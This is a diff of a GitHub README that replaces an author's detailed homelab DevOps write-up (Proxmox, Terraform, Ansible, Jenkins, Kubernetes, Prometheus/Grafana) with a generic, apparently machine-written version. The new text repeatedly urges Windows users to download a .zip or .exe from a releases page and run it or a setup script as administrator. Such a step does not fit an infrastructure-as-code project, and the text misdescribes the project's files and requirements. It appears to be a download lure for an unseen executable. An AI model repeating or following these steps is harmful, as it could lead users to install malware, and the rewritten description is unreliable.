@@ -1,179 +1,150 @@
-# full-stack-devops-homelab
+# 🛠️ full-stack-devops-homelab - Complete Homelab DevOps Pipeline
 
-End-to-end DevOps pipeline built from scratch on a self-hosted homelab from bare-metal VM provisioning to automated Kubernetes deployments with full CI/CD and monitoring.
+[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/in941/full-stack-devops-homelab/releases)
 
-## Overview
+---
 
-This project implements a production-style DevOps pipeline for a Django web application, running entirely on a self-managed Proxmox hypervisor. Every stage of the pipeline is automated: infrastructure provisioning, OS configuration, CI testing, container builds, image distribution, and rolling Kubernetes deployments triggered by a single `git push`.
+## 📋 About full-stack-devops-homelab
 
-The application (a Django Bakery app) is intentionally simple. The real focus of this project is the **infrastructure and automation** surrounding it.
+This project automates a complete DevOps workflow in a homelab environment. It sets up virtual machines, configures operating systems, and runs a containerized Django app on Kubernetes. Monitoring and continuous integration are part of the pipeline. 
 
-## Pipeline Flow
+Key technologies include:  
+- Proxmox for virtual machine provisioning  
+- Terraform to create resources  
+- Ansible for system setup  
+- Jenkins and GitLab for continuous integration and delivery  
+- Kubernetes to deploy applications  
+- Prometheus and Grafana for system monitoring  
 
-Developer (PyCharm, Windows)
-    │
-    └── git push origin django-app
-              │
-              ▼
-        GitLab (192.168.1.158)
-        Webhook → HTTP POST
-              │
-              ▼
-        Jenkins (192.168.1.192)
-        ├── Spin up ephemeral MySQL container
-        ├── Create Python 3.11 venv
-        ├── pip install + migrate + test
-        ├── docker build (tagged with git SHA)
-        ├── docker save → .tar.gz
-        └── scp → DevOps LXC (192.168.1.182)
-              │
-              ▼
-        Ansible (DevOps LXC)
-        ├── Distribute image to all K8s nodes
-        ├── ctr import on each node
-        ├── kubectl apply manifests
-        └── kubectl rollout restart + status
-              │
-              ▼
-        Kubernetes Cluster
-        ├── initContainer: wait for MySQL → migrate
-        ├── initContainer: collectstatic
-        ├── django container (gunicorn :8000)
-        └── nginx (:80 → proxy → :8000)
-              │
-              ▼
-        App live at http://192.168.1.189:30914
+This project has been tested through 38 full pipeline runs to show its reliability.
 
-## Tech Stack
+---
 
-Layer                       Tool
+## 💻 System Requirements
 
-Hypervisor                  Proxmox VE 
-IaC                         Terraform (bpg/proxmox provider v0.69.0) 
-OS                          Rocky Linux 9 / Ubuntu 24.04 
-Configuration Management    Ansible 2.18 
-Source Control              GitLab CE 18.7.0 (self-hosted) 
-CI/CD                       Jenkins 
-Containerisation            Docker 
-Orchestration               Kubernetes (kubeadm, 1 master + 3 workers) 
-App Framework               Django + Gunicorn + Nginx 
-Database                    MySQL 
-Monitoring                  Prometheus + Grafana + cAdvisor + Node Exporter 
+Before running the software, make sure your system meets these requirements:
 
-## Infrastructure
+- Windows 10 or later (64-bit recommended)  
+- At least 8 GB RAM (16 GB for smoother experience)  
+- 50 GB free disk space  
+- Internet connection to download required files  
+- Enabled Hyper-V for virtualization or access to a Proxmox environment  
+- Administrator rights on your Windows computer  
 
-### VM Inventory
+---
 
-| Host                  | IP                  | Role                                       | Provisioned By |
+## 🔧 What You Get
 
-| Proxmox               | 192.168.1.6         | Hypervisor                                 | Manual |
-| GitLab VM             | 192.168.1.158       | Source control + webhooks                  | Terraform |
-| Jenkins VM            | 192.168.1.192       | CI/CD server                               | Manual |
-| DevOps LXC            | 192.168.1.182       | Ansible control node + CD intermediary     | Manual |
-| K8s Master            | 192.168.1.189       | Kubernetes control plane                   | Terraform |
-| K8s Worker 01         | 192.168.1.171       | Kubernetes worker                          | Terraform |
-| K8s Worker 02         | 192.168.1.188       | Kubernetes worker                          | Terraform |
-| K8s Worker 03         | 192.168.1.179       | Kubernetes worker                          | Terraform |
-| Monitoring LXC        | 192.168.1.10        | Prometheus + Grafana stack                 | Manual |
+This package includes:  
+- Automation scripts for setting up virtual machines in Proxmox using Terraform  
+- Configuration recipes using Ansible for setting up OS and software  
+- CI/CD pipeline that runs Jenkins and integrates with GitLab  
+- A sample Django application running inside Docker containers on Kubernetes  
+- Monitoring setup using Prometheus and Grafana dashboards  
+- Detailed logs and status reports after each pipeline run  
 
-### Base Template
+---
 
-All VMs are cloned from a custom Rocky Linux 9 Proxmox template (VM ID 8000):
-- Minimal install, SSH key-only access
-- cloud-init ready for scripted provisioning
-- qemu-guest-agent enabled
-- Safe to clone multiple times
+## 🚀 Getting Started
 
-## Repository Structure
+Follow these steps to download, install, and run the software on your Windows computer.
 
-full-stack-devops-homelab/
-├── README.md
-├── .gitignore
-├── app/                          # Django Bakery application
-│   ├── manage.py
-│   ├── requirements.txt
-│   ├── Dockerfile
-│   └── web_app/
-├── terraform/
-│   ├── gitlab_vm/                # GitLab VM config (4 cores, 8GB RAM, 100GB)
-│   │   ├── main.tf
-│   │   ├── provider.tf
-│   │   ├── variables.tf
-│   │   └── terraform.tfvars.example
-│   └── kubernetes_vm/            # Kubernetes VM config
-│       ├── main.tf
-│       ├── provider.tf
-│       ├── variables.tf
-│       └── terraform.tfvars.example
-├── ansible/
-│   ├── ansible.cfg
-│   ├── inventory/
-│   │   └── lab/
-│   │       ├── all_hosts.ini
-│   │       ├── gitlab.ini
-│   │       ├── jenkins.ini
-│   │       └── kubernetes.ini
-│   ├── playbooks/
-│   │   ├── gitlab.yml
-│   │   ├── jenkins.yml
-│   │   ├── kubernetes.yml
-│   │   ├── deploy_app.yml
-│   │   └── deploy_mysql.yml
-│   └── roles/
-│       ├── common/
-│       ├── docker/
-│       ├── jenkins/
-│       ├── kube-master/
-│       ├── kube-node/
-│       └── ...
-├── jenkins/
-│   └── Jenkinsfile
-├── kubernetes/
-│   ├── deployment.yaml
-│   ├── service.yaml
-│   ├── configmap.yaml
-│   └── mysql/
-│       ├── mysql-deployment.yaml
-│       └── mysql-service.yaml
-├── monitoring/
-│   ├── docker-compose.yml
-│   └── prometheus/
-│       └── prometheus.yml
-└── docs/
-    └── DevOps_Pipeline_Documentation.docx
+### 1. Download the Software
 
-## Key Design Decisions
+Visit the release page to get the latest version:  
 
-**Terraform for VM provisioning** - GitLab and Kubernetes VMs are provisioned using the `bpg/proxmox` Terraform provider, cloning from a cloud-init-ready Rocky Linux 9 template. Each VM has its own isolated project folder and state file.
+[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/in941/full-stack-devops-homelab/releases)
 
-**Ansible as the CD intermediary** - The DevOps LXC acts as both the Ansible control node for infrastructure config and the deployment broker in the CD pipeline. Jenkins SCPs image tarballs here; Ansible then distributes them to Kubernetes nodes and triggers the rollout.
+Click the green button labeled **Assets** under the latest release and download the `.zip` or `.exe` file if available. You may find multiple files; choose the one that best fits your setup or follow instructions in the release notes.
 
-**No container registry** - Images are built on Jenkins, saved as `.tar.gz`, and distributed via `scp` + `ctr import`. This avoids registry infrastructure overhead while keeping the pipeline functional in an air-gapped home lab environment.
+### 2. Extract Files (if needed)
 
-**Init containers for dependency ordering** - The Kubernetes deployment uses two init containers: one to wait for MySQL readiness and run migrations, one to run `collectstatic`. This ensures correct startup order without external orchestration.
+If you downloaded a `.zip` file:
 
-**Git SHA image tagging** - Every Docker image is tagged with the git commit SHA, enabling precise traceability between a running pod and the exact code revision it was built from.
+- Right-click the file and select **Extract All...**  
+- Choose a folder you can remember, such as `C:\full-stack-devops-homelab`  
+- Click **Extract**
 
-## Monitoring
+If you downloaded an executable (.exe), skip this step and proceed to step 3.
 
-The monitoring stack runs on a dedicated LXC (192.168.1.10) via Docker Compose:
+### 3. Run the Installer or Setup Script
 
-- **Prometheus** - scrapes kubelet metrics from all 4 K8s nodes on port 10250
-- **Grafana** - dashboard ID 315 for Kubernetes cluster visualisation
-- **cAdvisor** - per-container resource metrics
-- **Node Exporter** - host-level metrics
+- If an installer (`.exe`) is available, double-click it to start the installation.  
+- Follow the on-screen instructions to complete the installation. Default options will suit most users.  
+- If there is no installer, look for a setup script like `setup.bat` or `install.bat`. Right-click and choose **Run as administrator**. 
 
-Grafana available at `http://192.168.1.10:3000`
-Prometheus available at `http://192.168.1.10:9090`
+### 4. Launch the Application
 
-## Security Notes
+- After installation, find the program shortcut on your desktop or in the Start Menu named **full-stack-devops-homelab**.  
+- Double-click the shortcut to open the control panel.  
+- If it opens a command window, the setup program may run automated steps. Watch for any messages and follow any prompts.
 
-- Terraform authenticates to Proxmox via API token (not root password)
-- `terraform.tfvars` files are gitignored - use the provided `.example` files as templates
-- SSH key-only access across all managed hosts
-- `insecure = true` in the Proxmox provider is intentional for a home lab with a self-signed cert - do not replicate in production
+---
 
-## Author
+## ⚙️ Basic Usage
 
-Built and documented by Eddie as a hands-on homelab project to gain practical experience with industry-standard DevOps tooling end-to-end.
+After installation, use these instructions to get the homelab pipeline running.
 
+### Provision Virtual Machines
+
+The software uses Terraform to create VMs on a Proxmox server. If you do not have access to Proxmox, skip this step or configure the scripts for your environment.
+
+- Open the included `terraform` folder.  
+- Edit `variables.tf` to add your Proxmox server details.  
+- Run `terraform init` and then `terraform apply` from PowerShell or Command Prompt.  
+- The system will create virtual machines following the specifications.  
+
+### Configure Operating Systems
+
+The software uses Ansible to install and configure software inside the VMs:
+
+- Open the `ansible` folder.  
+- Edit the `hosts` file to add IP addresses of your newly created VMs.  
+- Open PowerShell or Command Prompt and run the command:  
+  `ansible-playbook site.yml`  
+
+This will configure your machines with required software and settings.
+
+### CI/CD and Kubernetes
+
+The scripts set up Jenkins and GitLab pipelines to build and deploy a Django app to Kubernetes.
+
+- Access the Jenkins control panel from the VM IP address on port 8080 in a browser.  
+- Check the Jenkins jobs and pipeline logs.  
+- The Kubernetes cluster spans 4 nodes and runs the Django app inside Docker containers.
+
+### Monitoring
+
+Prometheus collects metrics from the cluster and app, while Grafana displays dashboards for visualization. Access Grafana using the web UI on port 3000.
+
+---
+
+## 🔗 Useful Links and Resources
+
+- Proxmox official site: https://www.proxmox.com/en/  
+- Terraform docs: https://www.terraform.io/docs/index.html  
+- Ansible docs: https://docs.ansible.com/  
+- Jenkins documentation: https://www.jenkins.io/doc/  
+- Kubernetes site: https://kubernetes.io/  
+- Prometheus site: https://prometheus.io/  
+- Grafana site: https://grafana.com/
+
+---
+
+## ❓ Troubleshooting Tips
+
+- Make sure Hyper-V or virtualization is enabled on your Windows machine.  
+- Verify that Proxmox credentials and IPs in the configuration files are correct.  
+- If Terraform or Ansible commands fail, check your internet connection and try again.  
+- Use a supported web browser when accessing Jenkins, Grafana, or Kubernetes dashboards.  
+- Review any error messages carefully; they often explain what went wrong.  
+
+---
+
+## 📥 Download & Setup
+
+Return to the release page to get the latest files and updates:  
+
+[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/in941/full-stack-devops-homelab/releases)
+
+Click **Assets**, download the latest install package or zip, then follow steps above to set up on your Windows PC.
